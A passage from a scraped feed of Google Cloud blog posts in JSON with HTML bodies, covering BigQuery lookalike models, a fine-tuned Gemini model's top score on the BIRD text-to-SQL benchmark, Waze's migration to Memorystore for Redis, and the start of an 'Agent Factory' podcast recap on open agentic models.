Vector Search by using the dot product and Manhattan norm. This practical approach, leveraging BigQuery ML and vector offerings, allowed us to create bespoke lookalike models with just one single SQL script and overcome challenges of cost, scale, and performance without a specialized vector database.</span></p>\n<p><span style=\"vertical-align: baseline;\">Using BigQuery ML and vector offerings, coupled with its robust, serverless architecture, we were able to release bespoke lookalike models catering to individual customer domains and needs. Together, Zeotap and Google Cloud look forward to partnering to help marketers expand their reach everywhere.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The Built with BigQuery advantage for ISVs and data providers</strong></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Built with BigQuery helps companies like Zeotap build innovative applications with Google Data Cloud. Participating companies can:</span></p>\n<ul>\n<li style=\"font-style: italic; vertical-align: baseline;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Accelerate product design and architecture through access to designated experts who can provide insight into key use cases, architectural patterns, and best practices.</span></p>\n</li>\n<li style=\"font-style: italic; vertical-align: baseline;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Amplify success with joint marketing programs to drive awareness, generate demand, and increase adoption.</span></p>\n</li>\n</ul>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">BigQuery gives ISVs the advantage of a powerful, highly scalable unified Data Cloud for the agentic era, that’s integrated with Google Cloud’s open, secure, sustainable platform. </span><a href=\"https://cloud.google.com/solutions/data-cloud-isvs\"><span style=\"font-style: italic; vertical-align: baseline;\">Click here to learn more about Built with BigQuery.</span></a></p></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/how-to-get-gemini-to-deeply-understand-your-database/",
        "title": "A new top score: Advancing Text-to-SQL on the BIRD benchmark",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Hero_image_Echo_1_RGB.max-600x600.png",
        "author": "Tom Kubik",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In the fast-evolving world of agentic development, natural language is becoming the standard for interaction. This shift is deeply connected to the power of operational databases, where a more accurate text-to-SQL capability is a major catalyst for building better, more capable agents. </span><span style=\"vertical-align: baseline;\">From empowering non-technical users to self-serve data, to accelerating analyst productivity, the ability to accurately translate natural language questions into SQL is a game-changer. As end-user engagements increasingly happen over chat, conversations become the fundamental connection between businesses and their customers</span><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">In an earlier post, \"</span><a href=\"https://cloud.google.com/blog/products/databases/techniques-for-improving-text-to-sql\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Getting AI to write good SQL: Text-to-SQL techniques explained</span></a><span style=\"vertical-align: baseline;\">,\" we explored the core </span><span style=\"font-style: italic; vertical-align: baseline;\">challenges</span><span style=\"vertical-align: baseline;\"> of text-to-SQL — handling complex business context, ambiguous user intent, and subtle SQL dialects — and the general </span><span style=\"font-style: italic; vertical-align: baseline;\">techniques</span><span style=\"vertical-align: baseline;\"> used to solve them.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we're moving from theory to practice. We're excited to share that Google Cloud has scored a new state-of-the-art result</span><strong style=\"vertical-align: baseline;\"> on the </strong><a href=\"https://bird-bench.github.io/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">BIRD</strong></a><strong style=\"vertical-align: baseline;\"> benchmark's Single Trained Model Track.</strong><span style=\"vertical-align: baseline;\"> We scored 76.13, ahead of any other single-model solution (higher is better). In general, the closer you get to the benchmark of human performance (92.96), the harder it is to score incremental gains. </span></p>\n<p><span style=\"vertical-align: baseline;\">BIRD (BIg Bench for LaRge-scale Database Grounded Text-to-SQL Evaluation) is an industry standard for testing text-to-SQL solutions. BIRD spans over 12,500 unique question-SQL pairs from 95 databases with a total size of 33 GB. The Single Trained Model Track is designed to measure the raw, intrinsic capability of the model itself, restricting the use of complex preprocessing, retrieval, or agentic frameworks often used to boost model accuracy. In other words, success here reflects an advancement in the model's core ability to generate SQL.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - BIRD leaderboard result\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_ur0KlJx.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Gemini scores #1 place in BIRD (October ‘25)</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">From research to industry-leading products</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This leap in more accurate natural-language-to-SQL capability, often referred to as NL2SQL, isn't just an internal research or engineering win; it fundamentally elevates the customer experience across several key data services,and our state-of-the-art research in this field is enabling us to create industry-leading products that customers leverage to activate their data with agentic AI.</span></p>\n<p><span style=\"vertical-align: baseline;\">Consider </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/natural-language-landing\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB AI’s natural language capability</strong></a><span style=\"vertical-align: baseline;\">, a tool that customers use to allow end users to query the most current operational data using natural language. For instance, companies like Hughes, an Echostar Corporation, depend on AlloyDB’s NL2SQL for critical tasks like call analytics. Numerous other retail, technology, and industry players also integrate this capability into their customer-facing applications. With NL2SQL that is near-100% accurate, customers gain the confidence to build and deploy applications in production workloads that rely on real-time data access.</span></p>\n<p><span style=\"vertical-align: baseline;\">The benefits of NL2SQL extend to analysis, as exemplified with </span><a href=\"https://docs.cloud.google.com/bigquery/docs/conversational-analytics\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">conversational analytics in BigQuery</strong></a><span style=\"vertical-align: baseline;\">. This service lets business users and data analysts explore data, run reports, and extract business intelligence from vast historical datasets using natural language. The introduction of a multi-turn chat experience, combined with a highly accurate NL2SQL engine, helps them make informed decisions with the confidence that the responses from BigQuery-based applications are consistently accurate.</span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, developers are finding new efficiencies. They have long relied on </span><a href=\"https://docs.cloud.google.com/alloydb/docs/write-sql-gemini\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Code Assist (GCA)</strong></a><span style=\"vertical-align: baseline;\"> for code generation, aiding their application development with databases across Spanner, AlloyDB, and Cloud SQL Studio. With the availability of more accurate NL2SQL, developers will be able to use AI coding assistance to generate SQL code too. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">BIRD: a proving ground for core model capability</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">BIRD benchmark </strong><span style=\"vertical-align: baseline;\">is one of the most commonly used benchmarks in the text-to-SQL field. It moves beyond simple, single-table queries to cover real-world</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">challenges our models must handle, such as reasoning over very large schemas</span><strong style=\"vertical-align: baseline;\">,</strong><span style=\"vertical-align: baseline;\"> dealing with ambiguous values, and incorporating external business knowledge. Crucially, BIRD measures a critical standard: </span><strong style=\"vertical-align: baseline;\">execution-verified accuracy</strong><span style=\"vertical-align: baseline;\">. This means a query is not just considered 'correct' if it appears right; it must also successfully run and return the correct data.</span></p>\n<p><span style=\"vertical-align: baseline;\">We specifically targeted the Single Trained Model Track because it allows us to isolate and measure the model's core ability to solve the text-to-SQL task (rather than an ensemble, a.k.a., a system with multiple components such as multiple parallel models, re-rankers, etc.). This distinction is critical, as text-to-SQL accuracy can be improved with techniques like dynamic few-shot retrieval or schema preprocessing; this track reflects the model's true reasoning power. By focusing on a single-model solution, these BIRD results demonstrate that enhancing the core model creates a stronger foundation for systems built on top of it.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Our method: Specializing the model</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Achieving a state-of-the-art score doesn't happen only by using a powerful base model. The key is to </span><span style=\"font-style: italic; vertical-align: baseline;\">specialize</span><span style=\"vertical-align: baseline;\"> the model. We developed a </span><span style=\"vertical-align: baseline;\">recipe</span><span style=\"vertical-align: baseline;\"> designed to transform the model from a general-purpose reasoner into a highly specialized SQL-generation expert.</span></p>\n<p><span style=\"vertical-align: baseline;\">This </span><span style=\"vertical-align: baseline;\">recipe</span><span style=\"vertical-align: baseline;\"> consisted of three critical phases applied </span><span style=\"font-style: italic; vertical-align: baseline;\">before</span><span style=\"vertical-align: baseline;\"> inference:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Rigorous data filtering:</strong><span style=\"vertical-align: baseline;\"> Ensuring the model learns from a flawless, \"gold standard\" dataset.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Multitask learning:</strong><span style=\"vertical-align: baseline;\"> Teaching the model not just to </span><span style=\"font-style: italic; vertical-align: baseline;\">translate</span><span style=\"vertical-align: baseline;\">, but to understand the implicit subtasks required for writing a correct SQL query.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Test-time scaling</strong><span style=\"vertical-align: baseline;\">: “Self consistency” a.k.a., picking the best answer.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\"> Let's break down each step.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - Our recipe\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_-_Our_recipe.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Our process for achieving SOTA result</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Step 1: Start with a clean foundation (data filtering)</strong></p>\n<p><span style=\"vertical-align: baseline;\">One important tenet of fine-tuning is \"garbage in, garbage out.\" A model trained on a dataset with incorrect, inefficient, or ambiguous queries may learn incorrect patterns. The training data provided by the </span><a href=\"https://bird-bench.github.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BIRD</span></a><span style=\"vertical-align: baseline;\"> benchmark is  powerful, but like most large-scale datasets, it's not perfect.</span></p>\n<p><span style=\"vertical-align: baseline;\">Before we could teach the model to be a SQL expert, we had to curate a gold-standard dataset. We used a rigorous two-stage pipeline: first, </span><strong style=\"vertical-align: baseline;\">execution-based validation</strong><span style=\"vertical-align: baseline;\"> to execute every query and discard any that failed, returned an error, or gave an empty result. Second, we used </span><strong style=\"vertical-align: baseline;\">LLM-based validation</strong><span style=\"vertical-align: baseline;\">, where multiple LLMs act as a \"judge\" to validate the semantic alignment between the question and the SQL, catching queries that run but don’t </span><span style=\"font-style: italic; vertical-align: baseline;\">actually</span><span style=\"vertical-align: baseline;\"> answer the user's question. This aggressive filtering resulted in a smaller, cleaner, and more trustworthy dataset that helped our model learn from a signal of pure quality rather than noise.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Step 2: Make the model a SQL specialist (multitask learning)</strong></p>\n<p><span style=\"vertical-align: baseline;\">With a clean dataset, we could move on to the supervised fine-tuning itself. This is the process of taking a large, general-purpose model — in our case, Gemini 2.5-pro — and training it further on our narrow, specialized dataset to make it an expert in a specific task</span><strong style=\"vertical-align: baseline;\">.</strong></p>\n<p><strong style=\"vertical-align: baseline;\">To build these skills directly into the model, we leveraged the publicly available </strong><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/models/gemini-use-supervised-tuning\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Supervised Tuning API for Gemini on Vertex AI</strong></a><strong style=\"vertical-align: baseline;\">.</strong><span style=\"vertical-align: baseline;\"> This service provided the foundation for our multitask supervised finetuning (SFT) approach, where we trained Gemini-2.5-pro on several distinct-but-related tasks simultaneously.</span></p>\n<p><span style=\"vertical-align: baseline;\">We also extended our training data to cover tasks outside of the main Text-to-SQL realm, helping enhance the model's reasoning, planning, and self-correction capabilities.</span></p>\n<p><span style=\"vertical-align: baseline;\">By training on this combination of tasks in parallel, the model learns a much richer, more robust set of skills. It goes beyond simple question-to-query mapping — it learns to deeply analyze the problem, plan its approach, and refine its own logic, leading to drastically improved accuracy and fewer errors.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Step 3: Inference accuracy + test-time scaling with self-consistency</strong></p>\n<p><span style=\"vertical-align: baseline;\">The final step was to ensure we could reliably pick the model's single best answer at test time. For this, we used a technique called </span><strong style=\"vertical-align: baseline;\">self-consistency</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">With self-consistency, instead of asking the model for just one answer, we ask it to generate several query candidates for the same question. We then execute these queries, cluster them by their execution results, and select a representative query from the largest cluster. This approach is powerful because if the model arrives at the same answer through different reasoning paths, that answer has a much higher probability of being correct.</span></p>\n<p><span style=\"vertical-align: baseline;\">It's important to note that self-consistency is a standard, efficient method, but it is not the only way to select a query. More complex, agentic frameworks can achieve even higher accuracy. For example, our team's own research on </span><a href=\"https://arxiv.org/pdf/2410.01943\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">CHASE-SQL</strong></a><span style=\"vertical-align: baseline;\"> (our state-of-the-art ensembling methodology) demonstrates that using diverse candidate generators and a trained </span><span style=\"font-style: italic; vertical-align: baseline;\">selection agent</span><span style=\"vertical-align: baseline;\"> can significantly outperform consistency-based methods.</span></p>\n<p><span style=\"vertical-align: baseline;\">For this benchmark, we wanted to focus on the </span><strong style=\"vertical-align: baseline;\">model's core performance.</strong><span style=\"vertical-align: baseline;\"> Therefore, we used the more direct self-consistency method: we generated several queries, executed them, and selected a query from the group that produced the most common result. This approach allowed us to measure the model's raw text-to-SQL ability, minimizing the influence of a more complex filtering or reranking system.</span></p>\n<p><span style=\"vertical-align: baseline;\">The BIRD Single-Model Track explicitly allows for self-consistency, which reflects the model's own internal capabilities. The benchmark categorizes submissions based on the number of candidates used ('Few', 'Many', or 'Scale'). We found our \"sweet spot\" in the </span><strong style=\"vertical-align: baseline;\">\"Few\" (1-7 candidates) category.</strong></p>\n<p><span style=\"vertical-align: baseline;\">This approach gave us the final, critical boost in execution accuracy that pushed our model to the top of the leaderboard. More importantly, it proves our core thesis: by investing in high-quality data and instruction tuning, you can build a single model that is powerful enough to be production-ready without requiring a heavy, high-latency inference framework.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A recipe for customizing Gemini for text-to-SQL</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A combination of clean data, multi-task learning, and efficient self-consistency</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">allowed us to take the powerful Gemini 2.5-pro model and build a specialist that achieved the top-ranking score on the BIRD single-model benchmark.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our fine-tuned model represents a much stronger baseline for text-to-SQL. However, it's important to note that this score is not the upper bound of accuracy. Rather, it is the new, higher baseline we have established for the core model's capability in a constrained setting. These results can be further amplified by either</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">creating an ensemble, aka integrating this specialist model into a broader system that employs preprocessing (like example retrieval) or agentic scaffolding (like our </span><a href=\"https://arxiv.org/pdf/2410.01943\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CHASE-SQL</span></a><span style=\"vertical-align: baseline;\"> research), or</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">optimizing model quality for your unique database by enhancing metadata and/or query examples (which is how our customers typically deploy production workloads). </span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Nevertheless, the insights from this research are actively informing how we build our next-generation AI-powered products for Google Data Cloud, and we’ll continue to deliver these enhancements in our data services. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Explore advanced text-to-SQL capabilities today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We’re constantly working to infuse our products with these state-of-the-art capabilities, starting with </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/natural-language-landing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bringing natural language queries to applications built on AlloyDB and BigQuery</span></a><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">For AI-enhanced retrieval, customers especially value </span><a href=\"https://docs.cloud.google.com/alloydb/docs/ai/ai-query-engine-landing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB and its AI functions</span></a><span style=\"vertical-align: baseline;\">. AlloyDB integrates AI capabilities directly into the database, allowing developers to run powerful AI models using standard SQL queries without moving data. It offers specialized operators such as AI.IF() for intelligent filtering, AI.RANK() for semantic reranking of search results, and AI.GENERATE() for in-database text generation and data transformation.</span></p>\n<p><span style=\"vertical-align: baseline;\">And if you want to write some SQL yourself, </span><a href=\"https://docs.cloud.google.com/alloydb/docs/write-sql-gemini\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\"> can help. With a simple prompt, you can instruct Gemini as to the query you want to create. Gemini will generate your code and you can immediately test it by executing it against your database. We look forward to hearing about what you build with it!</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3 - Gemini code assist\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_-_Gemini_code_assist.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/how-waze-keeps-traffic-flowing-with-memorystore/",
        "title": "Waze keeps traffic flowing with 1M+ real-time reads per second on Memorystore",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Waze-Memorystore-Hero.max-600x600.png",
        "author": "Yuval Kamran",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor’s note: </strong><span style=\"font-style: italic; vertical-align: baseline;\">Waze (a division of Google parent company Alphabet) depends on vast volumes of dynamic, real-time user session data to power its core navigation features, but scaling that data to support concurrent users worldwide required a new approach. Their team built a centralized Session Server backed by </span><a href=\"https://cloud.google.com/memorystore\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">Memorystore for Redis Cluster</span></a><span style=\"font-style: italic; vertical-align: baseline;\">, a fully managed service with 99.99% availability that supports partial updates and easily scales to Waze’s use case of over 1 million MGET commands per second with ~1ms latency. This architecture is the foundation for Waze’s continued backend modernization.</span></p>\n<hr />\n<p><span style=\"vertical-align: baseline;\">Real-time data drives the Waze app experience. Our turn-by-turn guidance, accident rerouting, and driver alerts depend on up-to-the-millisecond accuracy. But keeping that experience seamless for millions of concurrent sessions requires robust and battle hardened infrastructure that is built to manage a massive stream of user session data. This includes active navigation routes, user location, and driver reports that can appear and evolve within seconds.</span></p>\n<p><span style=\"vertical-align: baseline;\">Behind the scenes, user sessions are large, complex objects that update frequently and contribute to an extremely high volume of read and write operations. Session data was once locked in a monolithic service, tightly coupled to a single backend instance. That made it hard to scale and blocked other microservices from accessing the real-time session state. To modernize, we needed a shared, low-latency solution that could handle these sessions in real time and at global scale. Memorystore for Redis Cluster made that possible.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Build smarter with Google Cloud databases!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c13f9130&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Choosing the right route</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As we planned the move to a microservices-based backend, we evaluated our options, including Redis Enterprise Cloud, a self-managed Redis cluster, or continuing with our existing Memcached via Memorystore deployment. In the legacy setup, Memcached stored session data behind the monolithic Realtime (RT) server, but it lacked the replication, advanced data types, and partial update capabilities we wanted. We knew Redis had the right capabilities, but managing it ourselves or through a third-party provider would add operational overhead. </span></p>\n<p><span style=\"vertical-align: baseline;\">Memorystore for Redis Cluster offered the best of both worlds. It’s a fully managed service from Google Cloud with the performance, scalability, and resilience to meet Waze’s real-time demands. It delivers a 99.99% SLA and a clustered architecture for horizontal scaling. With the database decision made, we planned a careful migration from Memcached to Memorystore for Redis using a dual-write approach. For a period, both systems were updated in parallel until data parity was confirmed. Then we cut over to Redis with zero downtime.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Waze’s new data engine</strong></h3>\n<p><span style=\"vertical-align: baseline;\">From there, we built a centralized Session Server – our new command center for active user sessions – as a wrapper around Memorystore for Redis Cluster. This service became the single source of truth for all active user sessions, replacing the tight coupling between session data and the monolithic RT server. The Session Server exposes simple gRPC APIs, allowing any backend microservice to read from or write to the session state directly, including RT during the migration. This eliminated the need for client affinity, freed us from routing all session traffic through a single service, and made session data accessible across the platform.</span></p>\n<p><span style=\"vertical-align: baseline;\">We designed the system for resilience and scale from the ground up. Redis clustering and sharding remove single points of contention, letting us scale horizontally as demand grows. Built-in replication and automatic failover are designed to keep sessions online. While node replacements may briefly increase failure rates and latency for a short period, sessions are designed to stay online, allowing the navigation experience to quickly stabilize.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">And with support for direct gRPC calls from the mobile client to any backend service, we can use more flexible design patterns while shaving precious milliseconds off the real-time path.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Fewer pit stops, faster rides</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Moving from Memcached’s 99.9% SLA to Memorystore for Redis Cluster’s 99.99% means higher availability and resiliency from the service. Load testing proved the new architecture can sustain full production traffic, comfortably handling bursts of up to 1 million MGET commands per second with a stable sub-millisecond service latency. </span></p>\n<p><span style=\"vertical-align: baseline;\">Because Memorystore for Redis supports partial updates, we can change individual fields within a session object rather than rewriting the entire record. That reduces network traffic, speeds up write performance, and makes the system more efficient overall – especially important when sessions can grow to many megabytes in size. These efficiencies translate directly into giving our engineering teams more time to focus on application-level performance and new feature development.</span></p>\n<p><span style=\"vertical-align: baseline;\">Session data in Memorystore for Redis Cluster is now integral to Waze’s core features, from evaluating configurations to triggering real-time updates for drivers. It supports today’s demands and is built to handle what’s ahead.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The road ahead</strong></h3>\n<p><span style=\"vertical-align: baseline;\">By proving Memorystore for Redis Cluster in one of Waze’s most critical paths, we’ve built the confidence to use it in other high-throughput caching scenarios across the platform. The centralized Session Server and clustered Redis architecture are now standard building blocks in our backend, which we can apply to new services without starting from scratch.</span></p>\n<p><span style=\"vertical-align: baseline;\">With that initial critical path complete, our next major focus is the migration of all remaining legacy session management from our RT server. This work will ultimately give every microservice independent access to update session data. Looking ahead, we're also focused on scaling Memorystore for Redis Cluster to meet future user growth and fine-tuning it for both cost and performance.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Waze’s story showcases the power and flexibility of Memorystore for Redis Cluster, </span><span style=\"vertical-align: baseline;\">a fully managed service with 99.99% availability</span><span style=\"vertical-align: baseline;\"> for high-scale, real-time workloads. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Learn more about the power of </span><a href=\"https://cloud.google.com/memorystore\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Memorystore</span></a><span style=\"vertical-align: baseline;\"> and get started for free. </span></p>\n</li>\n<li><a href=\"https://cloud.google.com/memorystore/docs/cluster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">See Memorystore for Redis Cluster product documentation</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>",
        "published_date": "2025-11-14 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-cracking-open-an-open-model/",
        "title": "Agent Factory Recap: Cracking Open an Open Model",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/The_Agent_Factory_Blog_-_Hero.max-600x600.png",
        "author": "Ivan Nardini",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Welcome back to </span><a href=\"https://www.youtube.com/playlist?list=PLIivdWyY5sqLXR1eSkiM5bE6pFlXC-OSs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">The Agent Factory</span></a><span style=\"vertical-align: baseline;\">! In this episode, we’re joined by Ravin Kumar, a Research Engineer at DeepMind, to tackle one of the biggest topics in AI right now: building and training open-source agentic models. We wanted to go beyond just </span><span style=\"font-style: italic; vertical-align: baseline;\">using</span><span style=\"vertical-align: baseline;\"> agents and understand what it takes to build the entire factory line—from gathering data and supervised fine-tuning to reinforcement learning and evaluations.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=7YgUDf_JXN8\">\n\n      \n        <img alt=\"A YouTube video explaining building and training open-source agentic models\" src=\"https://img.youtube.com/vi/7YgUDf_JXN8/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=7YgUDf_JXN8\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This post guides you through the key ideas from our conversation. Use it to quickly recap topics or dive deeper into specific segments with links and timestamps.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Agent Industry Pulse</span></h2>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://www.youtube.com/watch?v=7YgUDf_JXN8&amp;t=54s\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">2:00</span></a></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image-1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image-1_ZfG9LL0.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Before diving into the deep research, we looked at the latest developments in the fast-moving world of AI agents.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://blog.google/technology/google-deepmind/gemini-computer-use-model/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini 2.5 Computer Use</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Google's new model can act as a virtual user, interacting with computer screens, clicking buttons, typing in forms, and scrolling. It’s a shift from agents that just know things to agents that can do tasks directly in a browser.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://blog.google/technology/developers/introducing-vibe-coding-in-google-ai-studio/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vibe Coding in AI Studio</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> A new approach to app building where you describe the \"vibe\" of the application you want, and the AI handles the boilerplate. It includes an Annotation Mode to refine specific UI elements with simple instructions like \"Change this to green.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://arxiv.org/abs/2510.18234\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">DeepSeek-OCR and Context Compression</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> DeepSeek introduced a method that treats documents like images to understand layout, compressing 10-20 text tokens into a single visual token. This drastically improves speed and reduces cost for long-context tasks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://blog.google/technology/ai/veo-updates-flow/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Veo 3.1 and Flow</span></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> The new update to the AI video model adds rich audio generation and powerful editing features. You can now use 